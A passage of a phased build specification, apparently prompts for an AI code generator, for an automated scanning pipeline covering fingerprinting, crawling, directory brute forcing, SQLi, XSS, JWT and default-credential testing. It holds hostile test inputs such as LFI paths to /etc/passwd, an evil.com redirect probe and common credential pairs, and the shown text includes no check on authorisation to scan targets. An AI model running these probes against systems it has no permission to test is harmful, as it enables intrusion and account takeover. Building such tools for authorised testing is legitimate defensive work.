  Reference BCHackTool's httpx flag usage for tech detection.
  Rewrite as clean async Python class.

TechnologyFingerprinter class:

run(scan_id: str,
    live_hosts: list[dict],
    existing_tech: list[dict],
    db: AsyncSession) → async → TechSummary

  STEP 1: Use httpx results already collected
    httpx tech field already has basic fingerprints
    Map httpx tech names to our Technology.category enum:
      "WordPress" → CMS
      "Laravel" → FRAMEWORK
      "React" → JAVASCRIPT_LIBRARY
      "Nginx" → SERVER
      "Apache" → SERVER
      "MySQL" → DATABASE
      "Cloudflare" → CDN

  STEP 2: Run WhatWeb on top 20 most interesting hosts
    Interesting = has login page, admin panel, or API
    Run whatweb_plugin on each
    Merge with httpx tech data (no duplicates by name)

  STEP 3: Enrich with version vulnerability data
    For each technology with a version:
      Check against known vulnerable versions:
      WordPress < 6.4 → flag outdated
      Apache < 2.4.58 → flag outdated (CVE-2023-45802)
      nginx < 1.25 → flag review needed
      OpenSSH < 9.0 → flag review needed
      PHP < 8.1 → flag outdated
      jQuery < 3.7 → flag outdated (XSS risk)
      Log4j any version → flag CRITICAL (log4shell)
    
    Set Technology.is_outdated = True if flagged
    Set Technology.cve_count from NVD if version known

  STEP 4: Store to DB
    For each (host, technology) pair:
      Create Technology record if not exists
      Set: name, version, category, confidence,
           is_outdated, latest_version, cve_count
    Bulk insert, commit once

  STEP 5: Build technology summary
    Group by category
    Flag high-risk combinations:
      WordPress + outdated PHP = escalated risk
      Public-facing admin panel + no WAF = escalated risk

  Return TechSummary:
    technologies: dict grouped by category
    cms_detected: str | None
    frameworks: list[str]
    outdated_count: int
    high_risk_combos: list[str]
    has_wordpress: bool
    has_php: bool
    has_graphql: bool (from endpoint scan)

determine_cms(tech_list) → str | None
  Returns CMS name if detected
  Priority: WordPress > Joomla > Drupal > None

determine_waf(host) → str | None
  Uses wafw00f result if available
  Returns WAF name or None

Generate tech_fingerprinter.py only. Stop after.
```

---

### Step 5.5 — Web Crawler Coordinator

```
PHASE 5 — STEP 5

Generate: backend/workers/processors/crawler_coordinator.py

WebCrawlerCoordinator class:

run(scan_id: str,
    live_hosts: list[dict],
    db: AsyncSession) → async → CrawlSummary

  STEP 1: Prepare target list
    Filter live_hosts where:
      is_alive == True
      status_code in [200, 301, 302, 403]
    Write URLs to temp file

  STEP 2: Run crawlers in parallel
    asyncio.gather():
      _run_katana(scan_id, target_file)
      _run_waybackurls(scan_id, targets)
      _run_gau(scan_id, targets)

  _run_katana(scan_id, target_file):
    Run katana_plugin with:
      depth = 3
      js-crawl = True (katana -jc flag)
      form-extraction = True
      timeout = 180
    Return parsed endpoints

  _run_waybackurls(scan_id, targets):
    Run waybackurls_plugin for each target domain
    Return historical URLs

  _run_gau(scan_id, targets):
    Run gau_plugin with all providers
    Return URL list

  STEP 3: Merge + deduplicate all URLs
    Combine results from all 3 crawlers
    Deduplicate by normalized URL
    Normalize:
      lowercase scheme and host
      sort query parameters
      strip tracking params (utm_*, fbclid, etc.)
    
  STEP 4: Classify each URL
    For each unique URL determine:
      is_api: "/api/" or "/v1/" or "/v2/" in path
      is_admin: "/admin/" "/dashboard/" "/manage/" in path
      is_login: "/login" "/signin" "/auth" in path
      is_graphql: "/graphql" "/gql" in path
      has_parameters: "?" in URL
      is_js_file: ends with .js or .mjs
      is_config: ends with .json .xml .yaml .env .git
      is_backup: ends with .bak .old .zip .tar.gz .sql
      method: GET (default) or POST (if from form extraction)

  STEP 5: Flag interesting URLs immediately
    For each URL where is_backup == True:
      Create Finding:
        title = "Backup File Exposed"
        severity = HIGH
        owasp = "A02:2025"
    
    For each URL where is_config == True:
      Create Finding:
        title = "Configuration File Exposed"
        severity = HIGH
    
    For each is_admin == True and accessible (200/301):
      Create Finding:
        title = "Admin Panel Discovered"
        severity = HIGH
        owasp = "A01:2025"

  STEP 6: Store all endpoints to DB
    Bulk insert Endpoint records
    Batch size: 200 per commit
    Fields: url, path, method, is_api, is_admin,
            is_login, is_graphql, has_parameters,
            is_js_file, source (katana/wayback/gau)

  STEP 7: Extract JavaScript files for secret scanning
    Filter all endpoints where is_js_file == True
    Write to: /tmp/agentsec_{scan_id}_jsfiles.txt
    This file is consumed by Secret Agent in Phase 7

  Return CrawlSummary:
    total_urls: int
    unique_urls: int
    api_endpoints: int
    admin_endpoints: int
    login_endpoints: int
    js_files: int
    backup_files_found: int
    config_files_found: int
    graphql_endpoints: int
    has_parameters: bool
    immediate_findings: int

Generate crawler_coordinator.py only. Stop after.
```

---

### Step 5.6 — Directory Discovery Coordinator

```
PHASE 5 — STEP 6

Generate: backend/workers/processors/directory_coordinator.py

DirectoryDiscoveryCoordinator class:

run(scan_id: str,
    interesting_hosts: list[dict],
    tech_summary: TechSummary,
    db: AsyncSession) → async → DirectorySummary

  STEP 1: Select wordlist based on tech stack
    wordlist_map = {
      "wordpress": "/opt/wordlists/wordpress.txt",
      "laravel": "/opt/wordlists/laravel.txt",
      "django": "/opt/wordlists/django.txt",
      "spring": "/opt/wordlists/spring.txt",
      "default": "/opt/wordlists/common.txt"
    }
    
    selected_wordlist = wordlist_map.get(
      tech_summary.cms_detected or "default"
    )
    
    Also add API wordlist if tech_summary.has_graphql
    or if endpoints suggest REST API structure

  STEP 2: Run ffuf on each host
    Limit to top 10 most interesting hosts
    (avoid burning all scan time on directory discovery)
    
    For each host:
      Run ffuf_plugin with:
        target = host URL
        wordlist = selected_wordlist
        mode = "directory"
        threads = 40
        match codes = 200,201,204,301,302,307,401,403
      
      If ffuf fails:
        Run feroxbuster as fallback
        Log: "ffuf failed on {host}, using feroxbuster"

  STEP 3: Run API path discovery separately
    If tech_summary.has_graphql or api_endpoints > 0:
      Run ffuf with API-specific wordlist:
        /opt/wordlists/api-endpoints.txt
      Target each host that has API endpoints
      Mode: api

  STEP 4: Process and classify results
    For each discovered path:
      classify:
        is_admin: same rules as crawler
        is_config: .json .xml .env .yaml extensions
        is_backup: .bak .old .zip extensions
        requires_auth: 401 response
        forbidden: 403 response (bypass candidate)

  STEP 5: Create immediate findings
    For each admin path with 200 status:
      Create Finding (severity HIGH)
    For each config/backup path:
      Create Finding (severity HIGH/CRITICAL)
    For each 401 path:
      Create Finding (severity INFO,
        title "Protected Endpoint — Auth Bypass Candidate")

  STEP 6: Store to DB
    Add newly discovered paths as Endpoint records
    Deduplicate against existing endpoints from crawler
    Only insert if path not already in DB for this scan

  Return DirectorySummary:
    hosts_scanned: int
    paths_discovered: int
    admin_paths: int
    config_paths: int
    backup_paths: int
    auth_protected: int
    forbidden_count: int
    wordlist_used: str
    fallback_used: bool

Generate directory_coordinator.py only. Stop after.
```

---

### Step 5.7 — Enum Result Processor

```
PHASE 5 — STEP 7

Generate: backend/workers/processors/enum_processor.py

EnumResultProcessor class:

Aggregates all enum phase data into DB and
updates scan-level statistics.

update_scan_stats(scan_id: str,
                  live_summary: LiveHostSummary,
                  port_summary: PortScanSummary,
                  tech_summary: TechSummary,
                  crawl_summary: CrawlSummary,
                  dir_summary: DirectorySummary,
                  db: AsyncSession) → async → None

  Update Scan record:
    total_assets = (
      live_summary.alive_count +
      port_summary.open_ports_found +
      crawl_summary.unique_urls
    )
    current_phase = "Vulnerability Assessment"
    progress = 90

  Update Domain record:
    waf_detected, waf_name (from tech data)
    hosting_provider (from ASN data in recon)
    state → VERIFIED

  Bulk update all live Subdomain records:
    state → VERIFIED
    is_alive = True

  Bulk update all dead Subdomain records:
    state → VERIFIED (still mark verified, just dead)
    is_alive = False

generate_enum_report_section(scan_id, db) → async → dict
  Generates a structured dict for the
  "Attack Surface Summary" section of final report:
  {
    "total_subdomains": ...,
    "live_hosts": ...,
    "dead_hosts": ...,
    "open_ports": [...],
    "technologies": [...],
    "admin_panels": [...],
    "api_endpoints": ...,
    "interesting_endpoints": [...],
    "immediate_findings": [...]
  }
  Store this dict as JSON in Scan.ai_summary
  (partial, full AI analysis comes in reporting phase)

Generate enum_processor.py only. Stop after.
```

---

### Step 5.8 — ScanContext Builder

```
PHASE 5 — STEP 8

Generate: backend/workers/processors/context_builder.py

ScanContextBuilder class:

build(scan_id: str,
      db: AsyncSession) → async → ScanContext

  Reads ALL collected data from DB for this scan.
  Constructs the ScanContext dataclass used by
  Decision Engine to choose vulnerability tools.

  Query DB for:
    scan = Scan record for scan_id
    subdomains = all Subdomain records (alive only)
    hosts = all Host records
    ports = all Port records
    technologies = all Technology records
    endpoints = all Endpoint records
    existing_findings = all Finding records so far

  Build ScanContext:
    scan_id = scan_id
    target = scan.target
    
    discovered_technologies:
      [tech.name for tech in technologies]
    
    open_ports:
      [port.number for port in ports
       where port.state == OPEN]
    
    live_hosts:
      [sub.name for sub in subdomains
       where sub.is_alive == True]
    
    has_parameters:
      any(ep.has_parameters for ep in endpoints)
    
    has_login_page:
      any(ep.is_login for ep in endpoints)
    
    has_api_endpoints:
      any(ep.is_api for ep in endpoints)
    
    has_graphql:
      any(ep.is_graphql for ep in endpoints)
    
    has_wordpress:
      any(t.name.lower() == "wordpress"
          for t in technologies)
    
    has_jwt:
      check if any endpoint returns JWT header
      or any finding already mentions JWT
    
    has_aws_references:
      any("aws" or "amazonaws" or "s3"
          in endpoint.url for ep in endpoints)
    
    has_github_references:
      any("github.com" in sub.cname or ""
          for sub in subdomains)
    
    subdomain_count = len(subdomains)
    endpoint_count = len(endpoints)
    scan_type = scan.scan_type
    
    js_file_path:
      "/tmp/agentsec_{scan_id}_jsfiles.txt"
      (written by CrawlerCoordinator)
    
    live_hosts_file:
      "/tmp/agentsec_{scan_id}_livehosts.txt"
    
    potential_takeover_subdomains:
      [sub.name for sub in subdomains
       where sub.takeover_vulnerable == True]

  Save ScanContext as JSON to:
    Redis key: agentsec:context:{scan_id}
    TTL: 86400 (24 hours)
    Also store in Scan.scan_config JSON field

  Return ScanContext instance

Generate context_builder.py only. Stop after.
```

---

### Step 5.9 — Phase 5 Verification

```
PHASE 5 — STEP 9 — FINAL VERIFICATION

Phase 5 complete. Write tests/test_enum_agent.py

Test cases:

1. test_live_host_processor_flags_admin_panel
   Input: httpx result with title "Jenkins"
   Assert: Finding created with severity HIGH
   Assert: owasp_category = "A02:2025"

2. test_live_host_processor_segregates_by_tech
   Input: 5 hosts, 2 WordPress, 1 Laravel, 2 unknown
   Assert: segregate_by_tech returns 3 groups
   Assert: wordpress group has 2 hosts

3. test_port_scan_coordinator_fallback
   Mock naabu to fail
   Mock rustscan to succeed with 3 ports
   Assert: rustscan results used
   Assert: fallback_used == "rustscan" in summary

4. test_port_scan_coordinator_dangerous_flag
   Input: port 6379 open
   Assert: Port.is_dangerous == True
   Assert: nmap redis script triggered

5. test_crawler_coordinator_classifies_backup
   Input: katana finds /backup.zip
   Assert: Endpoint.is_config == False (it's backup)
   Wait: actually assert is_backup == True
   Assert: Finding created for it

6. test_crawler_deduplication
   Input: katana finds /api/users,
          wayback finds /api/users (same)
   Assert: only 1 Endpoint record created

7. test_directory_coordinator_wordlist_selection
   Input: TechSummary with cms_detected = "wordpress"
   Assert: wordlist path contains "wordpress"

8. test_context_builder_has_wordpress_flag
   DB has Technology record name="WordPress" for scan
   Call ScanContextBuilder.build(scan_id, db)
   Assert: context.has_wordpress == True

9. test_context_builder_has_api_flag
   DB has Endpoint with is_api=True
   Assert: context.has_api_endpoints == True

10. test_enum_agent_fires_complete_event
    Mock all coordinators to return valid summaries
    Run full enum agent
    Assert: EnumCompleteEvent published to EventBus
    Assert: Scan.progress == 90 in DB

Run: pytest tests/test_enum_agent.py -v
All 10 must pass. Phase 5 only complete when all pass.
```

---
---

# PHASE 6 — VULNERABILITY AGENT

---

### Step 6.0 — Phase 6 Master Context

```
PHASE 6 — VULNERABILITY AGENT

Phases 0-5 complete. Enum Agent working.
Now building the most complex agent in the pipeline.

The Vulnerability Agent:
- Triggers on: enum_complete event
- Input: ScanContext (loaded from Redis + DB)
- Responsibility:
    Run vulnerability checks CONDITIONALLY
    based on ScanContext — not blindly run everything
    
    Covers:
    A. General vulnerability scan (Nuclei)
    B. Web application testing
       (SQLi, XSS, SSRF, LFI, RFI, XXE, CMDi,
        Path Traversal, CORS, SSTI, Open Redirect,
        Clickjacking, HTTP method tampering)
    C. Authentication testing
       (JWT, session cookies, auth bypass,
        weak passwords, OAuth)
    D. API security testing
       (REST enum, GraphQL, rate limiting,
        BOLA/BFLA, API key exposure)
    E. CMS-specific testing
       (WPScan for WordPress, JoomlaScan, etc.)
    F. Authorization testing
       (authz0 integration — extracted from cloned repo)
    G. Network-level checks
       (already flagged by PortScanCoordinator
        but deeper checks here)

Extraction from cloned repos for this phase:
  
  BCHackTool:
    Copy its Nuclei template selection logic
    Copy its SQLMap invocation flags
    Rewrite both as Python async methods
  
  authz0:
    Extract its core authorization test runner:
      YAML-based test definition format
      Token/session rotation between requests
      Response comparison logic (same resource,
      different roles → detect BOLA/IDOR)
    Rewrite as: AuthorizationTester class
    in backend/workers/processors/authz_tester.py
  
  claude-bug-bounty:
    Extract all vulnerability hunting methodology:
      IDOR detection patterns
      Race condition test approach
      OAuth test cases (redirect_uri, state param)
      ATO chain detection logic
      Validation gate logic (7-question gate)
    Rewrite as:
      VulnValidator class (validates each finding
        before creating DB record)
      AIHuntingAdvisor class (suggests next test
        based on current findings)

Architecture rules:
  - VulnAgent runs ONE parent Celery task: vuln.start
  - Parent task dispatches sub-tasks per module
  - Each module reports back findings
  - All findings go through VulnValidator BEFORE
    being written to DB (reduces false positives)
  - Decision Engine controls which modules activate
  - Runs in parallel with Secret Agent (Phase 7)

Token rule:
Generate in order, wait for "next" between each:
  Step 6.1: Vuln Agent Task (parent)
  Step 6.2: Nuclei Scan Module
  Step 6.3: Web App Test Module (SQLi, XSS, etc.)
  Step 6.4: Auth Test Module
  Step 6.5: API Security Module
  Step 6.6: Authorization Tester (authz0 extraction)
  Step 6.7: Vuln Validator (claude-bug-bounty extraction)
  Step 6.8: Finding Processor + OWASP Mapper
  Step 6.9: Verification
```

---

### Step 6.1 — Vuln Agent Task

```
PHASE 6 — STEP 1

Generate: backend/workers/vuln_agent.py

Task: vuln.start

@celery_app.task(
  bind=True,
  name="vuln.start",
  queue="vuln_queue",
  max_retries=1,
  soft_time_limit=5400,
  time_limit=6000
)
def start_vuln(self, scan_id: str,
               context_dict: dict) → dict:
  return asyncio.run(_async_start_vuln(
    self, scan_id, context_dict
  ))

Async implementation _async_start_vuln():

STEP 1: Initialize
  Load ScanContext from context_dict
  Also load from Redis as backup:
    Redis key: agentsec:context:{scan_id}
  Get DB session, EventBus, PluginExecutor
  Get tool decisions from DecisionEngine:
    tools = decision_engine.decide_vuln_tools(context)
  
  Update Scan:
    current_phase = "Vulnerability Assessment"
    current_tool = "Initializing"
    progress = 22 (parallel with secrets which is also 22)

  Log all tool decisions with reasons:
    For each ToolDecision in tools:
      await orchestrator.log_decision(
        scan_id, tool.tool_name, tool.reason, tools
      )
      (This feeds the AI Reasoning dashboard panel)

STEP 2: Run Nuclei (always first, broadest coverage)
  module = NucleiScanModule(executor, event_bus, db)
  nuclei_findings = await module.run(scan_id, context)
  Update Scan.current_tool = "nuclei"
  Update Scan.progress = 30
  Publish WebSocket: nuclei findings count

STEP 3: Run web application tests (if applicable)
  if context.has_parameters or context.has_login_page:
    module = WebAppTestModule(executor, event_bus, db)
    webapp_findings = await module.run(scan_id, context)
    Update progress = 45

STEP 4: Run auth tests
  if context.has_login_page or context.has_jwt:
    module = AuthTestModule(executor, event_bus, db)
    auth_findings = await module.run(scan_id, context)
    Update progress = 55

STEP 5: Run API security tests
  if context.has_api_endpoints or context.has_graphql:
    module = APISecurityModule(executor, event_bus, db)
    api_findings = await module.run(scan_id, context)
    Update progress = 65

STEP 6: Run CMS-specific tests
  if context.has_wordpress:
    module = CMSTestModule(executor, event_bus, db)
    cms_findings = await module.run(scan_id, context)
    Update progress = 70

STEP 7: Run authorization testing (authz0)
  if context.has_login_page and context.has_api_endpoints:
    module = AuthorizationTester(executor, event_bus, db)
    authz_findings = await module.run(scan_id, context)
    Update progress = 78

STEP 8: Aggregate all findings
  all_findings = (nuclei_findings + webapp_findings +
                  auth_findings + api_findings +
                  cms_findings + authz_findings)
  
  Run VulnValidator on all findings:
    validated = await validator.validate_all(all_findings)
    (removes false positives, deduplicates)
  
  Map all findings through FindingProcessor:
    await processor.process_all(scan_id, validated, db)
    (stores to DB with full OWASP/CVE/CWE mapping)

STEP 9: Update scan statistics
  total_findings = len(validated)
  critical_count = len([f for f where severity==CRITICAL])
  high_count = ...
  
  Update Scan:
    total_findings = total_findings
    risk_score = calculate_risk_score(validated)
    progress = 85

STEP 10: Fire completion event
  Publish VulnScanCompleteEvent(
    scan_id=scan_id,
    finding_count=total_findings,
    critical_count=critical_count,
    high_count=high_count
  )
  
  Set Redis flag: agentsec:vuln_complete:{scan_id} = "1"
  TTL: 3600

  Log: "Vuln scan complete. {total_findings} findings.
        Critical: {critical_count}"

calculate_risk_score(findings) → float:
  score = 0
  for finding in findings:
    if severity == CRITICAL: score += 10
    if severity == HIGH: score += 5
    if severity == MEDIUM: score += 2
    if severity == LOW: score += 0.5
    if severity == INFO: score += 0.1
  return min(score, 100.0)

Generate vuln_agent.py only. Stop after.
```

---

### Step 6.2 — Nuclei Scan Module

```
PHASE 6 — STEP 2

Generate: backend/workers/modules/nuclei_module.py

Extraction: Reference BCHackTool's Nuclei invocation.
Rewrite as clean async Python module.

NucleiScanModule class:

run(scan_id: str,
    context: ScanContext,
    db: AsyncSession) → async → list[NucleiFinding]

  STEP 1: Prepare target file
    Write all live host URLs to:
      /tmp/agentsec_{scan_id}_nuclei_targets.txt
    Include both HTTP and HTTPS versions of each host

  STEP 2: Run Nuclei in multiple passes

    Pass 1 — Critical templates first:
      Run nuclei_plugin with mode="cve"
      Templates: cves/ (latest CVE checks)
      Timeout: 300s

    Pass 2 — Exposure and misconfiguration:
      Run nuclei_plugin with:
      Templates: misconfiguration/,exposures/,
                 default-logins/,file/,
                 technologies/
      Timeout: 300s

    Pass 3 — Conditional templates:
      if context.has_wordpress:
        Run nuclei with templates: technologies/wordpress/
      if "ssl" or "tls" in any endpoint:
        Run nuclei with templates: ssl/
      if context.has_api_endpoints:
        Run nuclei with templates: vulnerabilities/generic/

    All 3 passes run sequentially.
    Collect all outputs.

  STEP 3: Deduplicate findings
    Deduplicate by (template-id, matched-at) tuple
    Same CVE on same URL = one finding

  STEP 4: Enrich each finding
    For each raw nuclei finding:
      If cve_id present:
        Lookup CVE severity from CVSS score
        Add CVSS vector if available
      Map nuclei severity to our Severity enum:
        "critical" → CRITICAL
        "high" → HIGH
        "medium" → MEDIUM
        "low" → LOW
        "info" → INFO
      Set owasp_category based on template tags:
        "sqli" tag → A05:2025
        "xss" tag → A05:2025
        "default-login" tag → A02:2025
        "exposure" tag → A02:2025
        "misconfiguration" tag → A02:2025
        "cve" tag → detect from CVE metadata
      Set cwe_id if nuclei template provides it

  STEP 5: Return enriched findings list

  Return list[NucleiFinding] — do not write to DB here.
  DB write is done by FindingProcessor (Step 6.8).

NucleiFinding dataclass:
  (mirrors Finding model fields but is not a DB model)
  title, severity, cvss_score, cve_id, cwe_id,
  owasp_category, affected_url, evidence,
  request, response, tool_found_by="nuclei",
  template_id, description

Generate nuclei_module.py only. Stop after.
```

---

### Step 6.3 — Web App Test Module

```
PHASE 6 — STEP 3

Generate: backend/workers/modules/webapp_test_module.py

WebAppTestModule class:

run(scan_id: str,
    context: ScanContext,
    db: AsyncSession) → async → list[WebFinding]

  STEP 1: Prepare URL lists
    Load endpoints from DB where has_parameters == True
    Write to: /tmp/agentsec_{scan_id}_params.txt
    
    Load all endpoints to:
      /tmp/agentsec_{scan_id}_all_urls.txt

  STEP 2: Run tests in parallel groups

    Group A — Injection tests (if has_parameters):
      asyncio.gather():
        _test_sqli(scan_id, context)
        _test_xss(scan_id, context)
        _test_ssti(scan_id, context)

    Group B — Request manipulation (always run):
      asyncio.gather():
        _test_open_redirect(scan_id, context)
        _test_cors(scan_id, context)
        _test_ssrf(scan_id, context)
        _test_xxe(scan_id, context)
        _test_lfi(scan_id, context)

    Group C — Client-side (always run):
      asyncio.gather():
        _test_clickjacking(scan_id, context)
        _test_http_methods(scan_id, context)
        _test_csrf(scan_id, context)

    Collect all findings from all groups.

_test_sqli(scan_id, context) → async → list[WebFinding]:
  Run sqlmap_plugin with:
    url_file = params file
    forms = True
    level = 3, risk = 2
    batch = True (no user input)
    random_agent = True
  If sqlmap finds injection:
    Create WebFinding with:
      severity = HIGH
      owasp = "A05:2025 — Injection"
  If sqlmap fails or times out:
    Run nuclei with sqli templates as fallback
    Log: "SQLMap failed, using Nuclei SQLi templates"

_test_xss(scan_id, context) → async → list[WebFinding]:
  Run dalfox_plugin with:
    url_file = all_urls with params
    silence = True
    worker = 20
  For each finding:
    Create WebFinding:
      severity = HIGH
      title = "Cross-Site Scripting (XSS)"
      owasp = "A05:2025"
      xss_type from dalfox output

_test_ssti(scan_id, context) → async → list[WebFinding]:
  Run tplmap_plugin on each URL with parameters
  Test all template engines (Jinja2, Twig, Freemarker)
  Finding severity = CRITICAL (RCE potential)
  owasp = "A05:2025"

_test_cors(scan_id, context) → async → list[WebFinding]:
  Run corsy_plugin with:
    input_file = all live hosts
  Check for:
    Wildcard origin (Access-Control-Allow-Origin: *)
    WITH credentials (Access-Control-Allow-Credentials: true)
    Null origin reflection
    Prefix match bypass (trusted.evil.com)
  Severity:
    Wildcard + credentials = HIGH
    Wildcard alone = MEDIUM
    Prefix bypass = MEDIUM

_test_ssrf(scan_id, context) → async → list[WebFinding]:
  Run Nuclei with SSRF templates:
    vulnerabilities/generic/ssrf*
    vulnerabilities/generic/blind-ssrf*
  Also test manually for endpoints with:
    Parameters named: url, endpoint, callback,
    redirect, dest, return, next, path, uri
  Severity = HIGH, owasp = "A01:2025"

_test_lfi(scan_id, context) → async → list[WebFinding]:
  Run Nuclei with LFI templates
  Also run ffuf with LFI wordlist on path parameters
  Test for: ../etc/passwd, ..%2F..%2Fetc/passwd,
            /proc/self/environ, /etc/hosts
  Severity = HIGH, owasp = "A05:2025"

_test_xxe(scan_id, context) → async → list[WebFinding]:
  Run Nuclei with XXE templates
  Only run if content-type = application/xml
    on any discovered endpoint
  Severity = HIGH, owasp = "A05:2025"

_test_open_redirect(scan_id, context) → async:
  Run Nuclei redirect templates
  Test parameters: redirect, return, url, next
  Severity = MEDIUM, owasp = "A01:2025"

_test_clickjacking(scan_id, context) → async:
  Check X-Frame-Options header on all live hosts
  httpx already collected headers
  Load from DB, check Technology or run quick httpx
  Severity = LOW, owasp = "A02:2025"

_test_http_methods(scan_id, context) → async:
  For each live host:
    Send OPTIONS request → check Allow header
    If TRACE or CONNECT allowed → HIGH finding
    If PUT or DELETE allowed without auth → HIGH finding
  Use httpx async client directly (no plugin needed)
  Severity = HIGH if dangerous methods, LOW if just OPTIONS

_test_csrf(scan_id, context) → async:
  Run Nuclei CSRF templates
  Check all POST forms for CSRF token presence
  Check SameSite cookie attribute (from Phase 5 data)
  Severity = MEDIUM, owasp = "A01:2025"

Return all findings from all methods as flat list.

Generate webapp_test_module.py only. Stop after.
```

---

### Step 6.4 — Auth Test Module

```
PHASE 6 — STEP 4

Generate: backend/workers/modules/auth_test_module.py

AuthTestModule class:

run(scan_id: str,
    context: ScanContext,
    db: AsyncSession) → async → list[AuthFinding]

  asyncio.gather():
    _test_jwt(scan_id, context)
    _test_session_cookies(scan_id, context)
    _test_auth_bypass(scan_id, context)
    _test_weak_passwords(scan_id, context)
    _test_oauth(scan_id, context)
    _test_default_creds(scan_id, context)

_test_jwt(scan_id, context) → async:
  Load JWT tokens from:
    Existing findings where title contains "JWT"
    Endpoints that return Authorization headers
  
  If JWT tokens found:
    Run jwt_tool_plugin with each token
    Tests performed by jwt_tool:
      alg:none attack
      weak HMAC secret (dictionary attack)
      RS256 → HS256 confusion
      Expired token acceptance
      Token without signature
    
    For each vulnerability found:
      severity = CRITICAL for alg:none
      severity = HIGH for weak secret
      owasp = "A07:2025"

_test_session_cookies(scan_id, context) → async:
  Run Nuclei cookie security templates
  Also: parse all Set-Cookie headers from httpx data
    already in DB or load via quick httpx check
  Check each cookie for:
    Missing HttpOnly flag → MEDIUM
    Missing Secure flag → MEDIUM
    Missing SameSite → LOW
    Excessive expiry (> 30 days for sensitive cookies) → LOW
  All map to owasp = "A07:2025"

_test_auth_bypass(scan_id, context) → async:
  Run Nuclei auth-bypass templates
  Also test:
    HTTP method override (X-HTTP-Method-Override: GET
      on POST endpoint)
    Path normalization bypass (/admin/../admin)
    Case sensitivity bypass (/Admin vs /admin)
  Severity = CRITICAL if bypass succeeds
  owasp = "A07:2025"

_test_weak_passwords(scan_id, context) → async:
  Load login endpoints from DB (is_login == True)
  For each login endpoint:
    Run limited credential test (NOT full brute force):
      Test only top 20 most common credentials:
      admin:admin, admin:password, admin:123456,
      root:root, test:test, guest:guest, etc.
    Use httpx async client with delay between requests
      (100ms minimum to avoid lockout)
    Max 20 attempts per endpoint (safety limit)
  Severity = CRITICAL if default cred works
  owasp = "A07:2025"

_test_oauth(scan_id, context) → async:
  Scan endpoints for OAuth patterns:
    URLs containing: /oauth, /authorize, /callback,
    /token, /connect, /auth
  For each OAuth endpoint found:
    Run Nuclei oauth templates
    Test for:
      Open redirect in redirect_uri parameter
        (try: redirect_uri=https://evil.com)
      Missing state parameter validation
      Token leakage in Referer header
      Authorization code reuse
  Severity = HIGH, owasp = "A07:2025"

_test_default_creds(scan_id, context) → async:
  Reference nuclei default-login templates
  Run Nuclei with: -t default-logins/
  Targets: all live services (Jenkins, Grafana,
    phpMyAdmin, Kibana, Redis, MongoDB, etc.)
  Severity = CRITICAL if default creds work
  owasp = "A07:2025"

Generate auth_test_module.py only. Stop after.
```

---

### Step 6.5 — API Security Module

```
PHASE 6 — STEP 5

Generate: backend/workers/modules/api_security_module.py

APISecurityModule class:

run(scan_id: str,
    context: ScanContext,
    db: AsyncSession) → async → list[APIFinding]

  asyncio.gather():
    _test_graphql(scan_id, context)     if has_graphql
    _test_api_auth(scan_id, context)    if has_api
    _test_rate_limiting(scan_id, context)
    _test_api_key_exposure(scan_id, context)
    _test_swagger_exposure(scan_id, context)
    _test_api_versioning(scan_id, context)
    _test_bola(scan_id, context)        if has_api + login

_test_graphql(scan_id, context) → async:
  Run graphw00f_plugin to confirm GraphQL engine
  Then run Nuclei GraphQL templates:
    graphql-introspection-enabled
    graphql-field-suggestion
    graphql-get-method-query
  
  If introspection enabled:
    Create Finding:
      title = "GraphQL Introspection Enabled"
      severity = MEDIUM
      evidence = full schema dump (first 500 chars)
      owasp = "A02:2025"
  
  Test for batching attacks:
    Send array of queries in one request
    If accepted → flag "GraphQL Batching Attack"
    severity = MEDIUM

_test_api_auth(scan_id, context) → async:
  Load all API endpoints from DB (is_api == True)
  For each API endpoint:
    Test without Authorization header:
      If returns 200 → CRITICAL: Unauthenticated API
      If returns 401/403 → PASS (auth working)
    
    Test with invalid token:
      Send: Authorization: Bearer invalid_token_xyz
      If returns 200 → CRITICAL: Token not validated
    
    Test with expired JWT (if JWT tokens found):
      If expired token accepted → HIGH: JWT Expiry Not Enforced
  
  All map to owasp = "A07:2025"

_test_rate_limiting(scan_id, context) → async:
  For each login endpoint:
    Send 30 rapid requests (10ms apart)
    If all return 200 or 401 (not 429):
      Create Finding:
        title = "Missing Rate Limiting on Login"
        severity = HIGH
        owasp = "A07:2025"
  
  For each API endpoint:
    Send 50 rapid requests
    If no 429 returned:
      title = "API Rate Limiting Not Enforced"
      severity = MEDIUM
      owasp = "A06:2025"
  
  Use asyncio.sleep(0.01) between requests
  Safety limit: max 50 requests per endpoint total

_test_api_key_exposure(scan_id, context) → async:
  Run SecretFinder plugin on all JS files
    (file list from /tmp/agentsec_{scan_id}_jsfiles.txt)
  Run Nuclei api-key exposure templates on all endpoints
  Check API responses for:
    keys in JSON response body
    keys in response headers
  Severity = CRITICAL, owasp = "A02:2025"

_test_swagger_exposure(scan_id, context) → async:
  Already partially done by Nuclei
  Also check these paths via httpx:
    /swagger-ui.html, /swagger.json,
    /api-docs, /openapi.json, /openapi.yaml,
    /api/swagger, /v1/swagger, /v2/api-docs
  If found and accessible:
    Download spec file
    Parse for:
      Sensitive endpoints described
      Authentication requirements
      Exposed internal API schemas
    Severity = MEDIUM (INFO if just exposed, MEDIUM if
      spec reveals sensitive endpoints)

_test_api_versioning(scan_id, context) → async:
  For each API endpoint found (e.g. /api/v2/users):
    Test older versions: /api/v1/users, /api/v0/users
    If older version returns 200:
      Create Finding:
        title = "Older API Version Accessible"
        severity = MEDIUM
        evidence = "v1 endpoint returns 200 while v2 exists"
        owasp = "A02:2025"

_test_bola(scan_id, context) → async:
  BOLA = Broken Object Level Authorization (IDOR)
  Extracted methodology from claude-bug-bounty repo.
  
  Look for ID patterns in API endpoints:
    /api/users/{id}, /api/orders/{id},
    /api/profile/{user_id}
  
  For each endpoint with numeric/UUID ID:
    If we have a test session (future: auth module
      provides session cookie):
      Request resource with ID+1, ID-1
      Compare responses
    
    Without auth:
      Request IDs 1, 2, 3 sequentially
      If returns different user data each time → IDOR
  
  Severity = CRITICAL if PII exposed
  Severity = HIGH if any other data exposed
  owasp = "A01:2025"

Generate api_security_module.py only. Stop after.
```

---

### Step 6.6 — Authorization Tester (authz0 extraction)

```
PHASE 6 — STEP 6

Generate: backend/workers/modules/authz_tester.py

This class is the AgentSec AI rewrite of authz0's
core authorization testing engine.

Reference: tools/authz0/ for:
  - YAML test definition format → rewrite as Python dataclass
  - Token rotation logic → rewrite as async method
  - Response comparison → rewrite as compare_responses()
  - Role-based access matrix → rewrite as AuthMatrix

Do NOT import from tools/authz0/.
Read the logic there, rewrite it here clean.

AuthMatrix dataclass:
  endpoints: list[str]
  roles: list[str] (e.g. ["anonymous", "user", "admin"])
